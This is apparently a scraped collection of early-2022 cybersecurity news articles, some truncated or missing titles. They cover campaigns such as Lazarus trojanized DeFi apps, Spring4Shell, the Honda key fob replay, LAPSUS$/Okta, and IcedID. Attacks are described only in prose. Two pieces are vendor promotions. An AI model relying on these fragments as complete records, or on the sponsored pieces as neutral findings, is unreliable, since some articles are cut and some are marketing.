simulation in a controlled environment, creating an unbiased assessment of each vendor’s platform and capabilities to detect and respond to threats.\nThe results of these evaluations are released at the end of every March and are intended to be used by security teams looking to bolster their security program, which often entails identifying a cybersecurity provider. The MITRE ATT&CK Evaluation tests specific capabilities using a public-facing methodology and provides an objective assessment without ranking each vendor’s performance.\nThe interpretation of the results and determining which vendor performed the best is up to the reader to decide. And that’s where things get tricky.\nThe MITRE ATT&CK Evaluation results are meant to be a helpful resource, and it behooves security leaders and executives to learn how to leverage these results. The difficulty is understanding what these results mean within the context of other vendors’ performance.\nThe 2022 MITRE ATT&CK Evaluation Results Webinar  \nAs many security experts will tell you, interpreting this data is easier said than done. Cynet, one of the vendors that participated in this year’s evaluation aims to bring some clarity to the confusion. The goal is to help organizations looking for a security provider use these results to assess which participating vendor’s capabilities best align with their needs.\nCynet’s CTO, Aviad Hasnis, will host this webinar series, starting on April 7, 2022. He’ll explain how you can use the MITRE ATT&CK Evaluation results as a tool in your search for a security vendor in addition to sharing details specific to Cynet’s performance.

{'title': 'North Korean Hackers Distributing Trojanized DeFi Wallet Apps to Steal Victims’ Crypto',
'text': 'The North Korean state-backed hacking crew, otherwise known as the Lazarus Group, has been attributed to yet another financially motivated campaign that leverages a trojanized decentralized finance (DeFi) wallet app to distribute a fully-featured backdoor onto compromised Windows systems.\nThe app, which is equipped with functionalities to save and manage a cryptocurrency wallet, is also designed to trigger the launch of the implant that can take control of the infected host. Russian cybersecurity firm Kaspersky said it first encountered the rogue application in mid-December 2021.\n\nThe infection scheme initiated by the app also results in the deployment of the installer for a legitimate application, which gets overwritten with a trojanized version in an effort to cover its tracks. That said, the initial access avenue is unclear, although it’s suspected to be a case of social engineering.\nThe spawned malware, which masquerades as Google’s Chrome web browser, subsequently launches a wallet app built for the DeFiChain, while also establishing connections to a remote attacker-controlled domain and awaiting further instructions from the server.\n\nBased on the response received from the command-and-control (C2) server, the trojan proceeds to execute a wide range of commands, granting it the ability to collect system information, enumerate and terminate processes, delete files, launch new processes, and save arbitrary files on the machine.\nThe C2 infrastructure used in this campaign exclusively consisted of previously compromised web servers located in South Korea, prompting the cybersecurity company to work with the country’s computer emergency response team (KrCERT) to dismantle the servers.\n\nThe findings come more than two months after Kaspersky disclosed details of a similar “SnatchCrypto“ campaign mounted by the Lazarus sub-group tracked as BlueNoroff to drain digital funds from victims’ MetaMask wallets.\n“For the Lazarus threat actor, financial gain is one of the prime motivations, with a particular emphasis on the cryptocurrency business. As the price of cryptocurrency surges, and the popularity of non-fungible token (NFT) and decentralized finance (DeFi) businesses continues to swell, the Lazarus group’s targeting of the financial industry keeps evolving,“ Kaspersky GReAT researchers pointed out.\n\n\nFound this article interesting?

'text': 'Three security vulnerabilities have been disclosed in the popular Wyze Cam devices that grant malicious actors to execute arbitrary code and access camera feeds as well as unauthorizedly read the SD cards, the latter of which remained unresolved for nearly three years after the initial discovery.\nThe security flaws relate to an authentication bypass (CVE-2019-9564), a remote code execution bug stemming from a stack-based buffer overflow (CVE-2019-12266), and a case of unauthenticated access to the contents of the SD card (no CVE).\n\nSuccessful exploitation of the bypass vulnerability could allow an outside attacker to fully control the device, including disabling recording to the SD card and turning on/off the camera, not to mention chaining it with CVE-2019-12266 to view the live audio and video feeds.\nRomanian cybersecurity firm Bitdefender, which discovered the shortcomings, said it reached out to the vendor way back in May 2019, following which Wyze released patches to fix CVE-2019-9564 and CVE-2019-12266 in September 2019 and November 2020, respectively.\nBut it wasn’t until January 29, 2022, that firmware updates were released to remediate the issue related to unauthenticated access to the contents of the SD card, around the same time when the Seattle-based wireless camera maker stopped selling version 1.\n\nWhen reached for a comment on the unusually long disclosure period, Dan Berte, director of IoT security at Bitdefender, told The Hacker News: “From our vantage point our visibility was limited into what Wyze could do about it at the time, having had no contact. We decided not to publish before we could reach them and make sure there’s a fix. When the vendor eventually replied we allowed more time for patching based on a convincing case Wyze could address them.“\nThis also means that only Wyze Cam versions 2 and 3 have been patched against the aforementioned vulnerabilities while leaving version 1 permanently exposed to potential risks.\n“Home users should keep a close eye on IoT devices and isolate them as much as possible from the local or guest network,“ the researchers cautioned. “This can be done by setting up a dedicated SSID exclusively for IoT devices, or by moving them to the guest network if the router does not support the creation of additional SSIDs.“\n\n\nFound this article interesting?

TAG said that the actor staged credential phishing campaigns targeting multiple U.S.-based NGOs and think tanks, the military of a Balkans country, and an unnamed Ukrainian defense contractor.\n\n“However, for the first time, TAG has observed COLDRIVER campaigns targeting the military of multiple Eastern European countries, as well as a NATO Centre of Excellence,“ TAG researcher Billy Leonard said. “These campaigns were sent using newly created Gmail accounts to non-Google accounts, so the success rate of these campaigns is unknown.“\nViasat breaks down February 24 Attack\nThe disclosure comes as U.S.-based telecommunications firm Viasat spilled details of a “multifaceted and deliberate“ cyber attack against its KA-SAT network on February 24, 2022, coinciding with Russia’s military invasion of Ukraine.\nThe attack on the satellite broadband service disconnected tens of thousands of modems from the network, impacting several customers in Ukraine and across Europe and affecting the operations of 5,800 wind turbines belonging to the German company Enercon in Central Europe.\n\n“We believe the purpose of the attack was to interrupt service,“ the company explained. “There is no evidence that any end-user data was accessed or compromised, nor customer personal equipment (PCs, mobile devices, etc.) was improperly accessed, nor is there any evidence that the KA-SAT satellite itself or its supporting satellite ground infrastructure itself were directly involved, impaired or compromised.“\nViasat linked the attack to a “ground-based network intrusion“ that exploited a misconfiguration in a VPN appliance to gain remote access to the KA-SAT network and execute destructive commands on the modems that “overwrote key data in flash memory,“ rendering them temporarily unable to access the network.\nRussian dissidents targeted with Cobalt Strike\nThe relentless attacks are the latest in a long list of malicious cyber activities that have emerged in the wake of the continuing conflict in Eastern Europe, with government and commercial networks suffering from a string of disruptive data wiper infections in conjunction with a series of ongoing distributed denial-of-service (DDoS) attacks.\nThis has also taken the form of compromising legitimate WordPress sites to inject rogue JavaScript code with the goal of carrying out DDoS attacks against Ukrainian domains, according to researchers from the MalwareHunterTeam.\n\nBut it’s not just Ukraine. Malwarebytes Labs this week laid out specifics of a new spear-phishing campaign targeting Russian citizens and government entities in an attempt to deploy pernicious payloads on compromised systems.\n“The spear phishing emails are warning people that use websites, social networks, instant messengers and VPN services that have been banned by the Russian Government and that criminal charges will be laid,“ Hossein Jazi said. “Victims are lured to open a malicious attachment or link to find out more, only to be infected with Cobalt Strike.“\nThe malware-laced RTF documents contain an exploit for the widely abused MSHTML remote code execution vulnerability (CVE-2021-40444), leading to the execution of a JavaScript code that spawns a PowerShell command to download and execute a Cobalt Strike beacon retrieved from a remote server.\nAnother cluster of activity potentially relates to a Russian threat actor tracked as Carbon Spider (aka FIN7), which has employed a similar maldocs-oriented attack vector that’s engineered to drop a PowerShell-based backdoor capable of fetching and running a next-stage executable.\nMalwarebytes also said it has detected a “significant uptick in malware families being used with the intent of stealing information or otherwise gaining access in Ukraine,“ including Hacktool.LOIC, Ainslot Worm, FFDroider, Formbook, Remcos, and Quasar RAT.\n“While these families are all relatively common in the cybersecurity world, the fact that we witnessed spikes almost exactly when Russian troops crossed the Ukrainian border makes these developments interesting and unusual,“ Adam Kujawa, director of Malwarebytes Labs, said in a statement shared with The Hacker News.\n\n\nFound this article interesting?

{'title': 'Unpatched Java Spring Framework 0-Day RCE Bug Threatens Enterprise Web Apps Security',
'text': 'A zero-day remote code execution (RCE) vulnerability has come to light in the Spring framework shortly after a Chinese security researcher briefly leaked a proof-of-concept (PoC) exploit on GitHub before deleting their account.\nAccording to cybersecurity firm Praetorian, the unpatched flaw impacts Spring Core on Java Development Kit (JDK) versions 9 and later and is a bypass for another vulnerability tracked as CVE-2010-1622, enabling an unauthenticated attacker to execute arbitrary code on the target system.\nSpring is a software framework for building Java applications, including web apps on top of the Java EE (Enterprise Edition) platform.\n\n“In certain configurations, exploitation of this issue is straightforward, as it only requires an attacker to send a crafted HTTP request to a vulnerable system,“ researchers Anthony Weems and Dallas Kaman said. “However, exploitation of different configurations will require the attacker to do additional research to find payloads that will be effective.“\nAdditional details of the flaw, dubbed “SpringShell“ and “Spring4Shell,“ have been withheld to prevent exploitation attempts and until a fix is in place by the framework’s maintainers, Spring.io, a subsidiary of VMware. It’s also yet to be assigned a Common Vulnerabilities and Exposures (CVE) identifier.\nIt’s worth noting that the flaw targeted by the zero-day exploit is different from two previous vulnerabilities disclosed in the application framework this week, including the Spring Framework expression DoS vulnerability (CVE-2022-22950) and the Spring Cloud expression resource access vulnerability (CVE-2022-22963).\n\nIn the interim, Praetorian researchers are recommending “creating a ControllerAdvice component (which is a Spring component shared across Controllers) and adding dangerous patterns to the denylist.“\nInitial analysis of the new code execution flaw in Spring Core suggests that its impact may not be severe. “[C]urrent information suggests in order to exploit the vulnerability, attackers will have to locate and identify web app instances that actually use the DeserializationUtils, something already known by developers to be dangerous,“ Flashpoint said in an independent analysis.\n\nDespite the public availability of PoC exploits, “it’s currently unclear which real-world applications use the vulnerable functionality,“ Rapid7 explained. “Configuration and JRE version may also be significant factors in exploitability and the likelihood of widespread exploitation.“\nThe Retail and Hospitality Information Sharing and Analysis Center (ISAC) also issued a statement that it has investigated and confirmed the “validity“ of the PoC for the RCE flaw, adding it’s “continuing tests to confirm the validity of the PoC.“\n“The Spring4Shell exploit in the wild appears to work against the stock ’Handling Form Submission’ sample code from spring.io,“ CERT/CC vulnerability analyst Will Dormann said in a tweet. “If the sample code is vulnerable, then I suspect there are indeed real-world apps out there that are vulnerable to RCE.“\n\n\nFound this article interesting?

{'title': 'Honda’s Keyless Access Bug Could Let Thieves Remotely Unlock and Start Vehicles',
'text': 'A duo of researchers has released a proof-of-concept (PoC) demonstrating the ability for a malicious actor to remote lock, unlock, and even start Honda and Acura vehicles by means of what’s called a replay attack.\nThe attack is made possible, thanks to a vulnerability in its remote keyless system (CVE-2022-27254) that affects Honda Civic LX, EX, EX-L, Touring, Si, and Type R models manufactured between 2016 and 2020. Credited with discovering the issue are Ayyappan Rajesh, a student at UMass Dartmouth, and Blake Berry (HackingIntoYourHeart).\n\n“A hacker can gain complete and unlimited access to locking, unlocking, controlling the windows, opening the trunk, and starting the engine of the target vehicle where the only way to prevent the attack is to either never use your fob or, after being compromised (which would be difficult to realize), resetting your fob at a dealership,“ Berry explained in a GitHub post.\nThe underlying issue is that the remote key fob on the affected Honda vehicles transmits the same, unencrypted radio frequency signal (433.215MHz) to the car, effectively enabling an adversary to intercept and replay the request at a later time to wirelessly start the engine as well as lock and unlock the doors.\nThis is not the first time a flaw of this kind has been uncovered in Honda vehicles. A related issue discovered in 2017 Honda HR-V models (CVE-2019-20626, CVSS score: 6.5) is said to have been “seemingly ignored“ by the Japanese company, Berry alleged.\n“Manufacturers must implement Rolling Codes, otherwise known as hopping code,“ Rajesh said. “It is a security technology commonly used to provide a fresh code for each authentication of a remote keyless entry (RKE) or passive keyless entry (PKE) system.“\n\nIn response to the findings, Honda said “this is generally not a new assertion with several past unconfirmed iterations of similar key fob devices, and in my opinion doesn’t merit any further reporting,“ and that it “has no plan to update older vehicles at this time.“\n“Legacy technology utilized by multiple automakers to remotely lock and unlock doors may be vulnerable to determined and very technologically sophisticated thieves,“ Honda spokesperson Chris Martin told The Hacker News.\n“At this time, it appears that the devices only appear to work within close proximity or while physically attached to the target vehicle, requiring local reception of radio signals from the vehicle owner’s key fob when the vehicle is opened and started nearby.“\n“Further, access to a vehicle without other means to drive the vehicle, while hi-tech in nature, does not provide thieves an advantage much greater than more traditional and certainly easier ways to gain entry to a vehicle. And there is no indication that the type of device in question is widely used.“\n“Also, for Acura and Honda vehicles, while certain models feature a remote start feature, a vehicle started remotely cannot be driven until a valid key fob with a separate immobilizer chip is present in the vehicle, reducing the likelihood of a vehicle theft. There is no indication that the reported vulnerability to door locks has resulted in an ability to actually drive an Acura or Honda vehicle.“\n\n\nFound this article interesting?

'text': 'A threat actor of likely Pakistani origin has been attributed to yet another campaign designed to backdoor targets of interest with a Windows-based remote access trojan named CrimsonRAT since at least June 2021.\n“Transparent Tribe has been a highly active APT group in the Indian subcontinent,“ Cisco Talos researchers said in an analysis shared with The Hacker News. “Their primary targets have been government and military personnel in Afghanistan and India. This campaign furthers this targeting and their central goal of establishing long term access for espionage.“\n\nLast month, the advanced persistent threat expanded its malware toolset to compromise Android devices with a backdoor named CapraRAT that exhibits a high “degree of crossover“ with CrimsonRAT.\nThe latest set of attacks detailed by Cisco Talos involves making use of fake domains that mimic legitimate government and related organizations to deliver the malicious payloads, including a Python-based stager used to install .NET-based reconnaissance tools and RATs as well as a barebones .NET-based implant to run arbitrary code on the infected system.\n\nBesides continually evolving their deployment tactics and malicious functionalities, Transparent Tribe is known to rely on a variety of delivery methods, such as executables impersonating installers of legitimate applications, archive files, and weaponized documents to target Indian entities and individuals.\nOne of the downloader executables masquerades as Kavach (meaning “armor“ in Hindi), an Indian government-mandated two-factor authentication solution required for accessing email services, in order to deliver the malicious artifacts.\nAlso put to use are COVID-19-themed decoy images and virtual hard disk files (aka VHDX files) that are used as a launchpad for retrieving additional payloads from a remote command-and-control server, such as the CrimsonRAT, which is used to gather sensitive data and establish long-term access into victim networks.\n\nWhile CrimsonRAT is the “staple implant of choice“ for the hacking crew to carry out espionage activities in campaigns that are meant to ensnare a wide swath of victims, the APT has also been observed deploying ObliqueRAT in “highly targeted attacks on government personnel and in operations where stealth is a prime focus of the attackers’ infection chain.“\nThe steady diversification of their malware portfolio notwithstanding, this is far from the first time Transparent Tribe has used legitimate applications maintained by the government of India as a lure.\nIn September 2021, Cisco Talos unmasked an overlapping campaign called “Operation Armor Piercer“ that utilized themes centered around operational documents and guides pertaining to the Kavach app to deliver the Netwire and Warzone (AveMaria) trojans.\nAnother notable activity is a July 2021 campaign undertaken by a threat actor called SideCopy, which is known to strike government personnel in India using themes and tactics similar to that of the Transparent Tribe group to distribute its own set of malware payloads.\nThis constituted dropping a Golang-based module called Nodachi that’s designed to conduct reconnaissance and steal files related to Kavach, with the end goal of siphoning access credentials from Indian government employees.\n“The use of multiple types of delivery vehicles and new bespoke malware that can be easily modified for agile operations indicates that the group is aggressive and persistent, nimble, and constantly evolving their tactics to infect targets,“ the researchers said.\n\n\n\n\nFound this article interesting?

'text': 'A group of academics has designed a new system known as “Privid“ that enables video analytics in a privacy-preserving manner to combat concerns with invasive tracking.\n“We’re at a stage right now where cameras are practically ubiquitous. If there’s a camera on every street corner, every place you go, and if someone could actually process all of those videos in aggregate, you can imagine that entity building a very precise timeline of when and where a person has gone,“ Frank Cangialosi, the lead author of the study and a researcher at the MIT’s Computer Science and Artificial Intelligence Laboratory (CSAIL), said in a statement.\n\n“People are already worried about location privacy with GPS — video data in aggregate could capture not only your location history, but also moods, behaviors, and more at each location,“ Cangialosi added.\nPrivid is built on the foundation of differential privacy, a statistical technique that makes it possible to collect and share aggregate information about users, while safeguarding individual privacy.\nThis is achieved by adding random noise to the results to prevent re-identification attacks. The amount of noise added is a trade-off – adding more noise makes the data more anonymous, but it also makes the data less useful – and it’s determined by the privacy budget, which ensures that the results are still accurate and at the same time configured low enough to prevent data leakage.\nThe querying framework involves an approach called “duration-based privacy“ wherein the target video is chopped temporally into chunks of same duration that’s then fed separately into the analyst’s video processing module to produce the “noisy“ aggregate result.\n\nThe underlying idea is that by adding specialized types of noise to the data or analysis methods, it can prevent relevant parties from identifying an individual while simultaneously not obscuring findings about societal patterns that emerge when performing analyses on the video inputs, such as, say, counting the number of people that passed by a camera in one day, or computing the average speed of cars observed.\nThis also prevents a malicious actor from singling out specific individuals and determining their presence (or lack thereof) in the videos.\n“In building Privid, we do not advocate for the increase of public video surveillance and analysis. Instead, we observe that it is already prevalent, and is driven by strong economic and public safety incentives,“ the researchers concluded.\n“Consequently, it is undeniable that the analysis of public video will continue, and thus, it is paramount that we provide tools to improve the privacy landscape for such analytics.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have shed more light on a malicious loader that runs as a server and executes received modules in memory, laying bare the structure of an “advanced multi-layered virtual machine“ used by the malware to fly under the radar.\nWslink, as the malicious loader is called, was first documented by Slovak cybersecurity company ESET in October 2021, with very few telemetry hits detected in the past two years spanning Central Europe, North America, and the Middle East.\n\nAnalysis of the malware samples have yielded little to no clues about the initial compromise vector used, and no code, functionality, or operational similarities have been uncovered to suggest that this is a tool from a previously identified threat actor.\nPacked with a file compression utility named NsPack, Wslink makes use of what’s called a process virtual machine (VM), a mechanism to run an application in a platform-independent manner that abstracts the underlying hardware or operating system, as an obfuscation method but with a crucial difference.\n\n“Virtual machines used as obfuscation engines […] are not intended to run cross-platform applications and they usually take machine code compiled or assembled for a known ISA [instruction set architecture], disassemble it, and translate that to their own virtual ISA,“ ESET malware analyst Vladislav Hrčka said.\n\n“The strength of this obfuscation technique resides in the fact that the ISA of the VM is unknown to any prospective reverse engineer – a thorough analysis of the VM, which can be very time-consuming, is required to understand the meaning of the virtual instructions and other structures of the VM.“\nWhat’s more, the virtualized Wslink malware package comes with a diverse arsenal of tactics to hamper reverse engineering, including junk code, encoding of virtual operands, merging of virtual instructions, and the use of a nested virtual machine.\n“Obfuscation techniques are a kind of software protection intended to make code hard to understand and hence conceal its objectives; obfuscating virtual machine techniques have become widely misused for illicit purposes such as obfuscation of malware samples, since they hinder both analysis and detection,“ Hrčka said.\n\n\nFound this article interesting?

{'title': 'A Large-Scale Supply Chain Attack Distributed Over 800 Malicious NPM Packages',
'text': 'A threat actor dubbed “RED-LILI“ has been linked to an ongoing large-scale supply chain attack campaign targeting the NPM package repository by publishing nearly 800 malicious modules.\n“Customarily, attackers use an anonymous disposable NPM account from which they launch their attacks,“ Israeli security company Checkmarx said. “As it seems this time, the attacker has fully-automated the process of NPM account creation and has opened dedicated accounts, one per package, making his new malicious packages batch harder to spot.“\nThe findings build on recent reports from JFrog and Sonatype, both of which detailed hundreds of NPM packages that leverage techniques like dependency confusion and typosquatting to target Azure, Uber, and Airbnb developers.\n\nAccording to a detailed analysis of RED-LILI’s modus operandi, earliest evidence of anomalous activity is said to have occurred on February 23, 2022, with the cluster of malicious packages published in “bursts“ over a span of a week.\nSpecifically, the automation process for uploading the rogue libraries to NPM, which Checkmarx described as a “factory,“ involves using a combination of custom Python code and web testing tools like Selenium to simulate user actions required for replicating the user creation process in the registry.\n\nTo get past the one-time password (OTP) verification barrier put in place by NPM, the attacker leverages an open-source tool called Interactsh to extract the OTP sent by NPM servers to the email address provided during sign-up, effectively allowing the account creation request to succeed.\n\nArmed with this brand new NPM user account, the threat actor then proceeds to create and publish a malicious package, only one per account, in an automated fashion, but not before generating an access token so as to publish the package without requiring an email OTP challenge.\n“As supply chain attackers improve their skills and make life harder for their defenders, this attack marks another milestone in their progress,“ the researchers said. “By distributing the packages across multiple usernames, the attacker makes it harder for defenders to correlate [and] take them all down with ’one stroke.’ By that, of course, making the chances of infection higher.“\n\n\nFound this article interesting?

{'title': 'New Report on Okta Hack Reveals the Entire Episode LAPSUS$ Attack',
'text': 'An independent security researcher has shared what’s a detailed timeline of events that transpired as the notorious LAPSUS$ extortion gang broke into a third-party provider linked to the cyber incident at Okta in late January 2022.\nIn a set of screenshots posted on Twitter, Bill Demirkapi published a two-page “intrusion timeline“ allegedly prepared by Mandiant, the cybersecurity firm hired by Sitel to investigate the security breach. Sitel, through its acquisition of Sykes Enterprises in September 2021, is the third-party service provider that provides customer support on behalf of Okta.\nThe authentication services provider revealed last week that on January 20, it was alerted to a new factor that was added to a Sitel customer support engineer’s Okta account, an attempt that it said was successful and blocked.\n\nThe incident only came to light two months later after LAPSUS$ posted screenshots on their Telegram channel as evidence of the breach on March 22.\nThe malicious activities, which gave the threat actor access to nearly 366 Okta customers, occurred over a five-day window between January 16 and 21, during which the hackers carried out different phases of the attack, including privilege escalation after gaining an initial foothold, maintaining persistence, lateral movement, and internal reconnaissance of the network.\n\nOkta claimed that it had shared indicators of compromise with Sitel on January 21 and that it received a summary report about the incident from Sitel only on March 17. Subsequently, on March 22, the same day the criminal group shared the screenshots, it said it obtained a copy of the complete investigation report.\nSubsequently, on March 22, the same day the criminal group shared the screenshots, it obtained a copy of the complete investigation report.\n“Even when Okta received the Mandiant report in March explicitly detailing the attack, they continued to ignore the obvious signs that their environment was breached until LAPSUS$ shined a spotlight on their inaction,“ Demirkapi wrote in a tweet thread.\n\nThe San Francisco-based company, in a detailed FAQ posted on March 25, acknowledged that its failure to notify its users about the breach in January was a “mistake.“\n“In light of the evidence that we have gathered in the last week, it is clear that we would have made a different decision if we had been in possession of all of the facts that we have today,“ Okta said, adding it “should have more actively and forcefully compelled information from Sitel.“\nSitel, for its part, said it’s “cooperating with law enforcement“ on the incident and has clarified that the breach affected “a portion of the legacy Sykes network only,“ adding it “took swift action to contain the attack and to notify and protect any potentially impacted clients who were serviced by the legacy organization.“\nThe development comes as the City of London Police told The Hacker News last week that seven people connected to the LAPSUS$ gang were arrested and subsequently released under investigation. “Our enquiries remain ongoing,“ the agency added.\n\n\nFound this article interesting?

'text': 'A new email phishing campaign has been spotted leveraging the tactic of conversation hijacking to deliver the IcedID info-stealing malware onto infected machines by making use of unpatched and publicly-exposed Microsoft Exchange servers.\n“The emails use a social engineering technique of conversation hijacking (also known as thread hijacking),“ Israeli company Intezer said in a report shared with The Hacker News. “A forged reply to a previous stolen email is being used as a way to convince the recipient to open the attachment. This is notable because it increases the credibility of the phishing email and may cause a high infection rate.“\nThe latest wave of attacks, detected in mid-March 2022, is said to have targeted organizations within energy, healthcare, law, and pharmaceutical sectors.\n\nIcedID, aka BokBot, like its counterparts TrickBot and Emotet, is a banking trojan that has evolved to become an entry point for more sophisticated threats, including human-operated ransomware and the Cobalt Strike adversary simulation tool.\nIt’s capable of connecting to a remote server and downloading next-stage implants and tools that allow attackers to carry out follow-on activities and move laterally across affected networks to distribute additional malware.\n\nIn June 2021, enterprise security firm Proofpoint disclosed an evolving tactic in the cybercrime landscape wherein initial access brokers were observed infiltrating target networks via first-stage malware payloads such as IcedID to deploy Egregor, Maze, and REvil ransomware payloads.\nWhile earlier IcedID campaigns have taken advantage of website contact forms to send malware-laced links to organizations, the current version of the attacks bank on vulnerable Microsoft Exchange servers to send the lure emails from a hijacked account, indicating a further evolution of the social engineering scheme.\n\n“The payload has also moved away from using Office documents to the use of ISO files with a Windows LNK file and a DLL file,“ researchers Joakim Kennedy and Ryan Robinson said. “The use of ISO files allows the threat actor to bypass the Mark-of-the-Web controls, resulting in execution of the malware without warning to the user.“\nThe idea is to send fraudulent replies to an already existing email thread plundered from the victim’s account by using the compromised individual’s email address to make the phishing emails appear more legitimate.\n“The use of conversation hijacking is a powerful social engineering technique that can increase the rate of a successful phishing attempt,“ the researchers concluded. “By using this approach, the email appears more legitimate and is transported through the normal channels which can also include security products.“\n\n\nFound this article interesting?

{'title': 'Of Cybercriminals and IP Addresses',
'text': 'You don’t like having the FBI knocking on your door at 6 am in the morning. Surprisingly, nor does your usual cybercriminal. That is why they hide (at least the good ones), for example, behind layers of proxies, VPNs, or TOR nodes.\nTheir IP address will never be exposed directly to the target’s machine. Cybercriminals will always use third-party IP addresses to deliver their attacks.\nThere are countless ways to deliver cyberattacks. But one thing is common to all of them. The need for a pool of IP addresses to serve as a medium. Criminals need IP addresses to deliver distributed denial of service attacks.\nCriminals need IP addresses to hide behind when probing services. Criminals need IP addresses to attempt brute force attacks. Criminals need IP addresses to run bot networks and services. In a nutshell, criminals need to maintain IP addresses under their control for pretty much anything. It is their most important asset and is the ammo they need to deliver attacks.\nSo how do cybercriminals get their hand on those infamous IP addresses, and what does this cost them? Here are some examples.\n“admin/admin“\nHijacking machines and more specifically networks of IoT devices. Poorly secured and managed fleets of IoT devices left with default access credentials and outdated firmware are the perfect target for that. Easy way to zombify a large number of devices, freshly served for DDoS attacks…hey “smart“ security cameras…we are watching you!\n“VPS are cheap“\nTake any cloud provider, fire up some instances, install bots to scan & attempt Log4j injections. At a limited cost, you have your bot network to scan targets for vulnerabilities. Of course, at some point, you will get flagged or the provider might catch you. But you can replicate your approach with cloud providers in other countries, maybe less regarding the usage of those VPS…\n’Into darkness“\nThey can also go to the supermarket for criminals, aka. “dark web“ and acquire a network of bots to deliver attacks like DDoS for a couple of hundred dollars. Script kiddies, welcome.\nTwo take-aways from these approaches : \nAcquiring IP addresses, although not impossible, costs money, time, and resources. Tamper with that, you tamper with a criminal’s ability to do his job efficiently. Ban known IPs used by criminals and you might just drastically increase the security of your online assets.\nThose bots and scan automation activities generate a lot of internet background noise. Imagine all those countless botnets scanning the IP space for different nefarious purposes. This is well known by SOC analysts as “alert fatigue“, meaning, this generates a large amount of data, without much-added value, but that analysts still need to take into account.\nBut good news everyone, there are solutions to make life more difficult for cybercriminals. \nIP reputation is part of the solution. Suppose users can preventively evaluate the risk of an IP connecting to a service. In that case, it can lock out known malicious users and make sure those IPs can not hurt anyone anymore, de-facto taking away the IP address pool criminals spent time and money to build.\nAt CrowdSec, we did fun experimenting: we set up two identical VPSs on a well-known cloud provider, with two simple services, SSH and Nginx. Nothing fancy, just like millions of machines out there in the wild. CrowdSec was installed on both to detect intrusion attempts. Still, one machine had the remediation agent (IPS), receiving IP reputation information from the CrowdSec community (daily 1 million signals shared) and preventively banning flagged IPs.\nThe result was quite stunning.\nThanks to the community blocklist, the machine with the IPS preventively blocked 92% of the attacks compared to the machine without the IPS. That is a notable increase in security level.\nYou can read more about the methodology and detailed results at: https://crowdsec.net/\nSource: crowdsec.net\nCommunity IP blocklists - with the previous curation - take care of both challenges. \nIt cripples criminals by nullifying their IP address pool. They spent time, money, resources to build them, and we, as a community, simply take them away in the blink of an eye. Take that scum!\nBut it also makes the life of analysts and cybersecurity experts much easier. By preventively blocking those nefarious IPs, the background noise is significantly reduced. We are talking about reducing by 90% the alerts that need to be analyzed by SOC people. That is much more time to focus on more significant alerts and topics. Alert fatigue? - bye-bye.\nIf you wish to partake in the biggest IP reputation community and hunt nefarious IP addresses while effectively protecting your online assets, join us at crowdsec.net\n\n\nFound this article interesting?

'text': 'The operators of the Purple Fox malware have retooled their malware arsenal with a new variant of a remote access trojan called FatalRAT, while also simultaneously upgrading their evasion mechanisms to bypass security software.\n“Users’ machines are targeted via trojanized software packages masquerading as legitimate application installers,“ Trend Micro researchers said in a report published on March 25, 2022. “The installers are actively distributed online to trick users and increase the overall botnet infrastructure.“\n\nThe findings follow prior research from Minerva Labs that shed light on a similar modus operandi of leveraging fraudulent Telegram applications to distribute the backdoor. Other disguised software installers include WhatsApp, Adobe Flash Player, and Google Chrome.\nThese packages act as a first-stage loader, triggering an infection sequence that leads to the deployment of a second-stage payload from a remote server and culminating in the execution of a binary that inherits its features from FatalRAT.\n\nFatalRAT is a C++-based implant designed to run commands and exfiltrate sensitive information back to a remote server, with the malware authors incrementally updating the backdoor with new functionality.\n“The RAT is responsible for loading and executing the auxiliary modules based on checks performed on the victim systems,“ the researchers said. “Changes can happen if specific [antivirus] agents are running or if registry keys are found. The auxiliary modules are intended as support for the group’s specific objectives.“\n\nFurthermore, Purple Fox, which comes with a rootkit module, comes with support for five different commands, including copying and deleting files from the kernel as well as evading antivirus engines by intercepting calls sent to the file system.\n\nThe findings also follow recent disclosures from cybersecurity firm Avast, which detailed a new campaign that involved the Purple Fox exploitation framework acting as a deployment channel for another botnet called DirtyMoe.\n“Operators of the Purple Fox botnet are still active and consistently updating their arsenal with new malware, while also upgrading the malware variants they have,“ the researchers said. “They are also trying to improve their signed rootkit arsenal for [antivirus] evasion and trying to bypass detection mechanisms by targeting them with customized signed kernel drivers.“\n\n\nFound this article interesting?

Also added alongside Kaspersky were China Telecom (Americas) Corp and China Mobile International USA.\n\nThe block list includes information security products, solutions, and services supplied, directly or indirectly, by the company or any of its predecessors, successors, parents, subsidiaries, or affiliates.\nThe FCC said the decision was made pursuant to a Binding Operational Directive (BOD) issued by the Department of Homeland Security on September 11, 2017 that barred federal agencies from using Kaspersky-branded products in their information systems.\nThe security services provider, in response, said it was disappointed with the FCC’s decision and that it’s “being made on political grounds“ without any technical assessment of its products.\n“Kaspersky maintains that the U.S. Government’s 2017 prohibitions on federal entities and federal contractors from using Kaspersky products and services were unconstitutional, based on unsubstantiated allegations, and lacked any public evidence of wrongdoing by the company,“ it added.\n\nThe announcement arrives as HackerOne said it’s indefinitely suspending Kaspersky’s access to the bug bounty platform in response to sanctions imposed on Russia and Belarus. The company said it “finds this unilateral action an unacceptable behavior.“\nWhen reached for a response, HackerOne told The Hacker News that “Our conversations with Kaspersky are ongoing, and we will continue to work with their team to address their concerns.“\nThe FCC’s decision also mirrors an advisory released by Germany’s Federal Office of Information Security (BSI) this month against using the company’s security solutions in the country over “doubts about the reliability of the manufacturer.“\n“No evidence of Kaspersky use or abuse for malicious purpose has ever been discovered and proven in the company’s twenty-five years’ history notwithstanding countless attempts to do so,“ the company’s founder Eugene Kaspersky said on March 16.\n\n\nFound this article interesting?

'text': 'A Chinese-speaking threat actor called Scarab has been linked to a custom backdoor dubbed HeaderTip as part of a campaign targeting Ukraine since Russia embarked on an invasion last month, making it the second China-based hacking group after Mustang Panda to capitalize on the conflict.\n“The malicious activity represents one of the first public examples of a Chinese threat actor targeting Ukraine since the invasion began,“ SentinelOne researcher Tom Hegel said in a report published this week.\n\nSentinelOne’s analysis follows an advisory from Ukraine’s Computer Emergency Response Team (CERT-UA) earlier this week outlining a spear-phishing campaign that leads to the delivery of a RAR archive file, which comes with an executable that’s designed to open a decoy file while stealthily dropping a malicious DLL called HeaderTip in the background.\n\nScarab was first documented by the Symantec Threat Hunter Team, part of Broadcom Software, in January 2015, when it detailed highly targeted attacks against Russian-speaking individuals since at least January 2012 to deploy a backdoor called Scieron.\n\n“If the attackers successfully compromise the victims’ computers, then they use a basic backdoor threat called Trojan.Scieron to drop Trojan.Scieron.B onto the computer,“ Symantec researchers noted at the time. “Trojan.Scieron.B has a rootkit-like component that hides some of its network activity and features more 